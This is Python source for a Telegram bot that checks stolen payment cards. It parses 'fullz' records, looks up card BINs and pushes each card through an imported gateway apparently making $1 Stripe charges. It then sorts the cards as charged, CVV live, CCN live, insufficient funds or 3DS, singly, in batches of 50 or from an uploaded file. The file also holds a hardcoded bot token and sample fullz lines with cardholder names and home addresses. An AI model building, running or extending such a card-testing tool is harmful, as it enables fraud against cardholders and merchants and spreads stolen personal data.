import requests
import telebot
import time
from telebot import types
from gatet import Tele
import os
import re

token = '8868124822:AAEoitsR_ASGYpFOyUpikeQfc0RaXRAWQFI'
bot = telebot.TeleBot(token, parse_mode="HTML")
subscriber = '7622959338'

def parse_fullz_to_cc(line):
    """
    Parse fullz and extract CC in format: CC|MM|YY|CVV
    Supports various formats:
    - 4355463262653879|09/27|928|Name|Address|...
    - 4355463262653879|09|27|928
    - 4355463262653879|09|2027|928
    """
    line = line.strip()
    
    # Pattern 1: CC|MM/YY|CVV|... (fullz format)
    pattern1 = r'(\d{15,16})\|(\d{2})/(\d{2,4})\|(\d{3,4})'
    match = re.search(pattern1, line)
    if match:
        cc = match.group(1)
        mm = match.group(2)
        yy = match.group(3)
        cvv = match.group(4)
        # Convert 4-digit year to 2-digit
        if len(yy) == 4:
            yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    
    # Pattern 2: CC|MM|YY|CVV (standard format)
    pattern2 = r'(\d{15,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})'
    match = re.search(pattern2, line)
    if match:
        cc = match.group(1)
        mm = match.group(2).zfill(2)  # Pad month to 2 digits
        yy = match.group(3)
        cvv = match.group(4)
        # Convert 4-digit year to 2-digit
        if len(yy) == 4:
            yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    
    # Pattern 3: Just the card number at start, try to extract exp and cvv
    pattern3 = r'(\d{15,16}).*?(\d{2})/(\d{2,4}).*?(\d{3,4})'
    match = re.search(pattern3, line)
    if match:
        cc = match.group(1)
        mm = match.group(2)
        yy = match.group(3)
        cvv = match.group(4)
        if len(yy) == 4:
            yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    
    return None

@bot.message_handler(commands=["start"])
def start(message):
    if not str(message.chat.id) == '7622959338':
        bot.reply_to(message, "ᴅᴏɴ'ᴛ ᴄᴏᴍᴇ @Peaceoutta")
        return
    bot.reply_to(message, "Send the file now or use /chk for single CC or /mass for multiple CCs/Fullz")

@bot.message_handler(commands=["chk"])
def handle_chk(message):
    if not str(message.chat.id) == '7622959338':
        bot.reply_to(message, "ᴅᴏɴ'ᴛ ᴄᴏᴍᴇ @Peaceoutta")
        return
    
    # Extract CC from command
    command = message.text.split(maxsplit=1)
    if len(command) < 2:
        bot.reply_to(message, "Usage: /chk <cc_number>\nExample: <code>/chk 1234567890123456|12|2025|123</code>")
        return
    
    cc = command[1].strip()
    
    # Try to parse as fullz first
    parsed_cc = parse_fullz_to_cc(cc)
    if parsed_cc:
        cc = parsed_cc
    
    # Validate CC format (accepts both 2-digit and 4-digit years)
    if not re.match(r'\d{16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', cc):
        bot.reply_to(message, "❌ Invalid CC format. Use:\n<code>1234567890123456|12|25|123</code> or\n<code>1234567890123456|12|2025|123</code>")
        return

    # Show processing message
    processing_msg = bot.reply_to(message, "ᴄʜᴇᴄᴋɪɴɢ ꜱɪɴɢʟᴇ ᴄᴄ...⌛")
    start_time = time.time()

    try:
        # Bin lookup
        try: 
            bin_data = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}', timeout=10).json()
            brand = bin_data.get('brand', 'Unknown')
            card_type = bin_data.get('type', 'Unknown')
            country = bin_data.get('country_name', 'Unknown')
            country_flag = bin_data.get('country_flag', 'Unknown')
            bank = bin_data.get('bank', 'Unknown')
        except Exception as bin_error:
            print(f"Bin Error: {bin_error}")
            brand = card_type = country = country_flag = bank = 'Unknown'

        # Process CC
        try:
            result = str(Tele(cc))
        except Exception as e:
            result = f"Gateway Error: {str(e)}"

        # Interpret results - FIXED: added Donation Successful detection
        if ('Thank you' in result or 'There has been a critical error on this website' in result or 'succeeded' in result or 'Order approved' in result or 
            'confirmation' in result or 'thank' in result or 'successfully' in result or 'successful' in result.lower()):
            status = "Approved 🔥"
            response = "ᥴꫝꪖ᥅ᧁꫀᦔ"
        elif 'card_not_supported' in result or 'Your card does not support this type of purchase' in result:
            status = "Approved ✅"
            response = "Not support this type of purchase"
        elif 'security code is incorrect' in result or 'security code is invalid' in result:
            status = "Approved ✅"
            response = "CCN Live"
        elif 'insufficient funds' in result:
            status = "Approved ✅"
            response = "Insufficient Funds"
        elif 'Verifying strong customer authentication' in result:
            status = "Approved ✅"
            response = "3DS Card"
        elif 'risk' in result or 'declined' in result:
            status = "Declined ⛔"
            response = "Card Declined"
        else:
            status = "Unknown Response ❓"
            response = result[:100] + ('...' if len(result) > 100 else '')

        # Build response
        response_time = time.time() - start_time
        msg = f"""
✪ ᴄᴀʀᴅ ➪ <code>{cc}</code>
✪ ѕтαтυѕ ➪ {status}
✪ ʀᴇsᴘᴏɴsᴇ ➪ {response}
✪ ɢᴀᴛᴇᴡᴀʏ ➪ sᴛʀɪᴘᴇ 1$
✪ ʙɪɴ ɪɴғᴏ ➪ {cc[:6]} | {card_type} | {brand}
✪ ᴄᴏᴜɴᴛʀʏ ➪ {country} {country_flag}
✪ ʙᴀɴᴋ ➪ {bank}
✪ ᴛɪᴍᴇ ᴛᴀᴋᴇɴ ➪ {response_time:.2f}s
✪ ᴄʜᴇᴄᴋᴇᴅ ʙʏ ➪ @Peaceoutta
        """.strip()

    except Exception as e:
        msg = f"❌ Critical Error: {str(e)}"

    # Send results
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=processing_msg.message_id,
        text=msg
    )

@bot.message_handler(commands=["mass"])
def handle_mass(message):
    if not str(message.chat.id) == '7622959338':
        bot.reply_to(message, "ᴅᴏɴ'ᴛ ᴄᴏᴍᴇ @Peaceoutta")
        return
    
    # Extract CCs from command
    command_text = message.text.replace('/mass', '').strip()
    
    if not command_text:
        bot.reply_to(message, """Usage: /mass <cc1> <cc2> <cc3> ...

Examples:
<code>/mass 1234567890123456|12|25|123 5678901234567890|01|26|456</code>

Or multiline:
<code>/mass
1234567890123456|12|25|123
5678901234567890|01|26|456</code>

Or fullz format:
<code>/mass
4355463262653879|09/27|928|Laiken M. culp|10866 War Emblem Avenue|DAPHNE|AL|36526
4355461268757421|02/28|941|Jaymes hayes|2830 N MULE DEER WAY|Meridian|ID|83646</code>

Max 50 cards per command.""")
        return
    
    # Parse each line and extract CCs
    lines = command_text.split('\n')
    cc_list = []
    
    for line in lines:
        # Try to parse as fullz
        parsed = parse_fullz_to_cc(line)
        if parsed:
            cc_list.append(parsed)
        else:
            # Try direct CC pattern matching
            cc_pattern = re.compile(r'\d{16}\|\d{1,2}\|\d{2,4}\|\d{3,4}')
            matches = cc_pattern.findall(line)
            cc_list.extend(matches)
    
    # Remove duplicates while preserving order
    seen = set()
    unique_cc_list = []
    for cc in cc_list:
        if cc not in seen:
            seen.add(cc)
            unique_cc_list.append(cc)
    
    cc_list = unique_cc_list
    
    if not cc_list:
        bot.reply_to(message, "❌ No valid CCs found. Check your format!")
        return
    
    # Limit to 50 cards
    if len(cc_list) > 50:
        bot.reply_to(message, f"❌ Too many cards! Max 50 per command. You sent {len(cc_list)}.")
        return
    
    # Show processing message
    total_cards = len(cc_list)
    processing_msg = bot.reply_to(message, f"ᴄʜᴇᴄᴋɪɴɢ {total_cards} ᴄᴀʀᴅꜱ...⌛\n\n💡 Parsed from fullz format automatically!")
    
    # Counters
    results = {
        'charged': [],
        'cvv_live': [],
        'ccn_live': [],
        'insufficient': [],
        '3ds': [],
        'declined': [],
        'errors': []
    }
    
    start_time = time.time()
    
    # Check each card
    for idx, cc in enumerate(cc_list, 1):
        try:
            # Normalize format (ensure 2-digit month)
            parts = cc.split('|')
            if len(parts) == 4:
                cc_num, mm, yy, cvv = parts
                mm = mm.zfill(2)
                # Convert 4-digit year to 2-digit if needed
                if len(yy) == 4:
                    yy = yy[2:]
                cc = f"{cc_num}|{mm}|{yy}|{cvv}"
            
            # BIN lookup
            try:
                bin_data = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}', timeout=5).json()
                brand = bin_data.get('brand', 'Unknown')
                card_type = bin_data.get('type', 'Unknown')
                country = bin_data.get('country_name', 'Unknown')
                country_flag = bin_data.get('country_flag', '🏳️')
                bank = bin_data.get('bank', 'Unknown')
            except:
                brand = card_type = country = country_flag = bank = 'Unknown'
            
            # Gateway check
            try:
                result = str(Tele(cc))
            except Exception as e:
                result = f"Gateway Error: {str(e)}"
            
            # Parse response and categorize - FIXED: added Donation Successful detection
            cc_info = f"{cc} | {brand} | {country} {country_flag}"

            if ('Thank you' in result  or 'There has been a critical error on this website' in result or 'succeeded' in result or 'Order approved' in result or 
                'confirmation' in result or 'successfully' in result or 'thank' in result or 'successful' in result.lower()):
                results['charged'].append(cc_info)
                status_emoji = "🔥"
                status_text = "ᥴꫝꪖ᥅ᧁꫀᦔ"
            elif 'card_not_supported' in result or 'Your card does not support this type of purchase' in result:
                results['cvv_live'].append(cc_info)
                status_emoji = "✅"
                status_text = "ᴄᴠᴠ ʟɪᴠᴇ"
            elif 'security code is incorrect' in result or 'security code is invalid' in result:
                results['ccn_live'].append(cc_info)
                status_emoji = "✅"
                status_text = "ᴄᴄɴ ʟɪᴠᴇ"
            elif 'insufficient funds' in result:
                results['insufficient'].append(cc_info)
                status_emoji = "✅"
                status_text = "ɪɴꜱᴜꜰꜰɪᴄɪᴇɴᴛ ꜰᴜɴᴅꜱ"
            elif 'Verifying strong customer authentication' in result:
                results['3ds'].append(cc_info)
                status_emoji = "✅"
                status_text = "3ᴅꜱ ᴄᴀʀᴅ"
            elif 'risk' in result or 'declined' in result:
                results['declined'].append(cc_info)
                status_emoji = "⛔"
                status_text = "ᴅᴇᴄʟɪɴᴇᴅ"
            else:
                results['errors'].append(f"{cc_info} | {result[:50]}")
                status_emoji = "❓"
                status_text = "ᴜɴᴋɴᴏᴡɴ"
            
            # Update progress every 5 cards or on last card
            if idx % 5 == 0 or idx == total_cards:
                progress_text = f"""🔄 ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ ᴘʀᴏɢʀᴇꜱꜱ
                
ᴘʀᴏɢʀᴇꜱꜱ ➪ {idx}/{total_cards} ({int(idx/total_cards*100)}%)

🔥 ᴄʜᴀʀɢᴇᴅ ➪ {len(results['charged'])}
✅ ᴄᴠᴠ ʟɪᴠᴇ ➪ {len(results['cvv_live'])}
✅ ᴄᴄɴ ʟɪᴠᴇ ➪ {len(results['ccn_live'])}
✅ ɪɴꜱᴜꜰꜰɪᴄɪᴇɴᴛ ➪ {len(results['insufficient'])}
✅ 3ᴅꜱ ➪ {len(results['3ds'])}
⛔ ᴅᴇᴄʟɪɴᴇᴅ ➪ {len(results['declined'])}
❓ ᴇʀʀᴏʀꜱ ➪ {len(results['errors'])}"""
                
                try:
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=processing_msg.message_id,
                        text=progress_text
                    )
                except:
                    pass
            
            # Small delay to avoid rate limiting
            time.sleep(0.5)
            
        except Exception as e:
            print(f"Error checking {cc}: {e}")
            results['errors'].append(f"{cc} | Error: {str(e)}")
    
    # Build final result message
    total_time = time.time() - start_time
    final_msg = f"""✅ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ ᴄᴏᴍᴘʟᴇᴛᴇᴅ

📊 ꜱᴜᴍᴍᴀʀʏ:
━━━━━━━━━━━━━━━━
ᴛᴏᴛᴀʟ ᴄᴀʀᴅꜱ ➪ {total_cards}
ᴛɪᴍᴇ ᴛᴀᴋᴇɴ ➪ {total_time:.2f}s

🔥 ᴄʜᴀʀɢᴇᴅ ➪ {len(results['charged'])}
✅ ᴄᴠᴠ ʟɪᴠᴇ ➪ {len(results['cvv_live'])}
✅ ᴄᴄɴ ʟɪᴠᴇ ➪ {len(results['ccn_live'])}
✅ ɪɴꜱᴜꜰꜰɪᴄɪᴇɴᴛ ➪ {len(results['insufficient'])}
✅ 3ᴅꜱ ➪ {len(results['3ds'])}
⛔ ᴅᴇᴄʟɪɴᴇᴅ ➪ {len(results['declined'])}
❓ ᴇʀʀᴏʀꜱ ➪ {len(results['errors'])}
━━━━━━━━━━━━━━━━"""
    
    # Add details for each category
    if results['charged']:
        final_msg += f"\n\n🔥 ᴄʜᴀʀɢᴇᴅ ({len(results['charged'])}):\n"
        for cc_info in results['charged'][:10]:  # Show max 10
            final_msg += f"├ <code>{cc_info}</code>\n"
        if len(results['charged']) > 10:
            final_msg += f"└ ...ᴀɴᴅ {len(results['charged']) - 10} ᴍᴏʀᴇ"
    
    if results['cvv_live']:
        final_msg += f"\n\n✅ ᴄᴠᴠ ʟɪᴠᴇ ({len(results['cvv_live'])}):\n"
        for cc_info in results['cvv_live'][:10]:
            final_msg += f"├ <code>{cc_info}</code>\n"
        if len(results['cvv_live']) > 10:
            final_msg += f"└ ...ᴀɴᴅ {len(results['cvv_live']) - 10} ᴍᴏʀᴇ"
    
    if results['ccn_live']:
        final_msg += f"\n\n✅ ᴄᴄɴ ʟɪᴠᴇ ({len(results['ccn_live'])}):\n"
        for cc_info in results['ccn_live'][:10]:
            final_msg += f"├ <code>{cc_info}</code>\n"
        if len(results['ccn_live']) > 10:
            final_msg += f"└ ...ᴀɴᴅ {len(results['ccn_live']) - 10} ᴍᴏʀᴇ"
    
    if results['insufficient']:
        final_msg += f"\n\n✅ ɪɴꜱᴜꜰꜰɪᴄɪᴇɴᴛ ({len(results['insufficient'])}):\n"
        for cc_info in results['insufficient'][:10]:
            final_msg += f"├ <code>{cc_info}</code>\n"
        if len(results['insufficient']) > 10:
            final_msg += f"└ ...ᴀɴᴅ {len(results['insufficient']) - 10} ᴍᴏʀᴇ"
    
    if results['3ds']:
        final_msg += f"\n\n✅ 3ᴅꜱ ({len(results['3ds'])}):\n"
        for cc_info in results['3ds'][:10]:
            final_msg += f"├ <code>{cc_info}</code>\n"
        if len(results['3ds']) > 10:
            final_msg += f"└ ...ᴀɴᴅ {len(results['3ds']) - 10} ᴍᴏʀᴇ"
    
    if results['declined']:
        final_msg += f"\n\n⛔ ᴅᴇᴄʟɪɴᴇᴅ ({len(results['declined'])}):\n"
        for cc_info in results['declined'][:5]:  # Show only 5 for declined
            final_msg += f"├ <code>{cc_info}</code>\n"
        if len(results['declined']) > 5:
            final_msg += f"└ ...ᴀɴᴅ {len(results['declined']) - 5} ᴍᴏʀᴇ"
    
    if results['errors']:
        final_msg += f"\n\n❓ ᴇʀʀᴏʀꜱ ({len(results['errors'])}):\n"
        for error_info in results['errors'][:5]:
            final_msg += f"├ {error_info}\n"
        if len(results['errors']) > 5:
            final_msg += f"└ ...ᴀɴᴅ {len(results['errors']) - 5} ᴍᴏʀᴇ"
    
    final_msg += f"\n\n✪ ʙʏ ➪ @Peaceoutta"
    
    # Send final results
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=processing_msg.message_id,
        text=final_msg
    )

@bot.message_handler(content_types=["document"])
def main(message):
    if not str(message.chat.id) == '7622959338':
        bot.reply_to(message, "ᴅᴏɴ'ᴛ ᴄᴏᴍᴇ @Peaceoutta")
        return
    dd = 0
    live = 0
    ch = 0
    insufficient = 0
    ccn = 0
    nt = 0
    sg = 0
    ko = (bot.reply_to(message, "ᴄʜᴇᴄᴋɪɴɢ...⌛").message_id)
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    with open("combo.txt", "wb") as w:
        w.write(ee)
    try:
        now = time.time()
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)
            for line in lino:
                # Parse fullz to CC format
                cc = parse_fullz_to_cc(line)
                if not cc:
                    # If parse fails, skip this line
                    dd += 1
                    continue
                
                cc = cc.strip()
                current_dir = os.getcwd()
                for filename in os.listdir(current_dir):
                    if filename.endswith(".stop"):
                        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\nʙᴏᴛ ʙʏ ➜ @Peaceoutta')
                        os.remove('stop.stop')
                        return
                try: 
                    data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6], timeout=5).json()
                    brand = data.get('brand', 'Unknown')
                    card_type = data.get('type', 'Unknown')
                    country = data.get('country_name', 'Unknown')
                    country_flag = data.get('country_flag', 'Unknown')
                    bank = data.get('bank', 'Unknown')
                except:
                    brand = card_type = country = country_flag = bank = 'Unknown'
                
                start_time = time.time()
                try:
                    last = str(Tele(cc))
                except Exception as e:
                    print(e)
                    last = "ERROR"
                if 'risk' in last:
                    last='declined'
                elif 'Duplicate' in last:
                    last='Approved'
                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
                status_btn = types.InlineKeyboardButton(f"• ѕтαтυѕ ➜ {last} •", callback_data='u8')
                cm3 = types.InlineKeyboardButton(f"• ᥴꫝꪖ᥅ᧁꫀᦔ ✅ ➜ [ {live} ] •", callback_data='x')
                cm4 = types.InlineKeyboardButton(f"• Not support this type of purchase ✅ ➜ [ {nt} ] •", callback_data='x')
                cm5 = types.InlineKeyboardButton(f"• 3ᴅs ᴄᴀʀᴅ ✅ ➜ [ {sg} ] •", callback_data='x')
                cm6 = types.InlineKeyboardButton(f"• ιηѕυƒƒι¢ιєηт ƒυη∂ѕ ✅  ➜ [ {insufficient} ] •", callback_data='x')
                cm7 = types.InlineKeyboardButton(f"• 𝐂𝐂𝐍✅ ➜ [ {ccn} ] •", callback_data='x')
                cm8 = types.InlineKeyboardButton(f"• ᦔꫀᥴꪶ꠸ꪀꫀᦔ ⛔ ➜ [ {dd} ] •", callback_data='x')
                cm9 = types.InlineKeyboardButton(f"• тσтαℓ 🏔️ ➜ [ {total} ] •", callback_data='x')
                stop=types.InlineKeyboardButton(f"[ ѕтσρ ]", callback_data='stop')
                mes.add(cm1, status_btn, cm3, cm4, cm5, cm6, cm7, cm8, cm9, stop)
                end_time = time.time()
                execution_time = end_time - start_time
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''𝐖𝐚𝐢𝐭 𝐟𝐨𝐫 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 
𝒃𝒚 ➜ @Peaceoutta ''', reply_markup=mes)
                msg = f'''✪ ᴄᴀʀᴅ  ➪ {cc} 
ѕтαтυѕ ➪ αρρяσνє∂ 🔥
𝐑𝐞𝐬𝐮𝐥𝐭 ➪ ᥴꫝꪖ᥅ᧁꫀᦔ
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➪ sᴛʀɪᴘᴇ 1$
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➪ 𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕
𝐁𝐢𝐧 ➪ {cc[:6]} - {card_type} - {brand} 
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➪ {country} - {country_flag} 
𝐁𝐚𝐧𝐤 ➪ {bank}
𝐁𝐲 ➪ (ℙ𝕖𝕒𝕔𝕖𝕠𝕦𝕥)
𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧 » {(time.time() - now):.2f} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬
𝐏𝐫𝐨𝐱𝐲𝐬 ➪ ʟɪᴠᴇ 🟢 '''
                print(last)
                # FIXED: added Donation Successful detection for file handler
                if ('Thank you' in last or 'There has been a critical error on this website' in last or 'succeeded' in last or 'successfully' in last or 'thank' in last or 'Order approved' in last or 
                    'Order Successful' in last or 'successful' in last.lower()):
                    live += 1
                    bot.reply_to(message, msg)
                elif 'card_not_supported' in last or 'Your card does not support this type of purchase' in last:
                    msg = f'''✪ ᴄᴀʀᴅ  ➪ {cc} 
ѕтαтυѕ ➪ αρρяσνє∂ ✅
𝐑𝐞𝐬𝐮𝐥𝐭 ➪ ᴄᴠᴠ ʟɪᴠᴇ
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➪ sᴛʀɪᴘᴇ 1$
𝐁𝐢𝐧 ➪ {cc[:6]} - {card_type} - {brand}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➪ {country} - {country_flag}
𝐁𝐚𝐧𝐤 ➪ {bank}
𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧 » {(time.time() - now):.2f} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬
𝐏𝐫𝐨𝐱𝐲𝐬 ➪ ʟɪᴠᴇ 🟢 '''
                    nt += 1
                    bot.reply_to(message, msg)				    
                elif 'security code is incorrect' in last or 'security code is invalid' in last:
                    msg = f'''✪ ᴄᴀʀᴅ  ➪ {cc} 
ѕтαтυѕ ➪ αρρяσνє∂ ✅
𝐑𝐞𝐬𝐮𝐥𝐭 ➪ ᴄᴄɴ ʟɪᴠᴇ 
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➪ sᴛʀɪᴘᴇ 1$
𝐁𝐢𝐧 ➪ {cc[:6]} - {card_type} - {brand}
𝐂𝐨𝐮ɴᴛʀʏ ➪ {country} - {country_flag}
𝐁𝐚ɴᴋ ➪ {bank}
𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧 » {(time.time() - now):.2f} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬
𝐏𝐫𝐨𝐱𝐲𝐬 ➪ ʟɪᴠᴇ 🟢 '''
                    ccn += 1
                    bot.reply_to(message, msg)
                elif 'insufficient funds' in last:
                    msg = f'''✪ ᴄᴀʀᴅ  ➪ {cc} 
ѕтαтυѕ ➪ αρρяσνє∂ ✅
𝐑𝐞𝐬𝐮𝐥𝐭 ➪ ɪɴsᴜғғɪᴄɪᴇɴᴛ ғᴜɴᴅs
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➪ sᴛʀɪᴘᴇ 1$
𝐁𝐢𝐧 ➪ {cc[:6]} - {card_type} - {brand}
𝐂𝐨ᴜɴᴛʀʏ ➪ {country} - {country_flag}
𝐁𝐚ɴᴋ ➪ {bank}
𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧 » {(time.time() - now):.2f} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬
𝐏𝐫𝐨𝐱𝐲𝐬 ➪ ʟɪᴠᴇ 🟢 '''
                    insufficient += 1
                    bot.reply_to(message, msg)
                elif 'Verifying strong customer authentication. Please wait...' in last:
                    msg = f'''✪ ᴄᴀʀᴅ  ➪ {cc} 
ѕтαтυѕ ➪ αρρяσνє∂ ✅
𝐑𝐞𝐬𝐮𝐥𝐭 ➪ 3ᴅs ᴄᴀʀᴅ
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➪ ꜱᴛʀɪᴘᴇ 1$
𝐁𝐢𝐧 ➪ {cc[:6]} - {card_type} - {brand}
𝐂𝐨ᴜɴᴛʀʏ ➪ {country} - {country_flag}
𝐁𝐚ɴᴋ ➪ {bank}
𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧 » {(time.time() - now):.2f} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬
𝐏𝐫𝐨𝐱𝐲𝐬 ➪ ʟɪᴠᴇ 🟢 '''
                    sg += 1
                    bot.reply_to(message, msg)	
                else:
                    dd += 1
                    time.sleep(5)
    except Exception as e:
        print(f"Batch Error: {e}")
    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='ᴄᴏᴍᴘʟᴇᴛᴇᴅ ✅\nʙᴏᴛ ʙʏ ➜ @Peaceoutta')

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    with open("stop.stop", "w") as file:
        pass

print("+-----------------------------------------------------------------+")
print("Bot is running...")
bot.polling()